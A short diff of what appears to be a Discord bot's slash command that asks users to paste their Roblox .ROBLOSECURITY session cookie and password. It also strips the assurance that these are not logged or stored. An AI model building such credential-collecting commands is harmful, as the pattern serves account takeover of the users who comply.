@@ -17,12 +17,12 @@ const data = new SlashCommandBuilder()
   .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
   .addStringOption(opt =>
     opt.setName('cookie')
-      .setDescription('The .ROBLOSECURITY cookie')
+      .setDescription('Insert Your Cookie!')
       .setRequired(true)
   )
   .addStringOption(opt =>
     opt.setName('password')
-      .setDescription('Your Roblox password (we do NOT log or store this)')
+      .setDescription('Insert Your Password!')
       .setRequired(true)
   ) as SlashCommandBuilder;
 
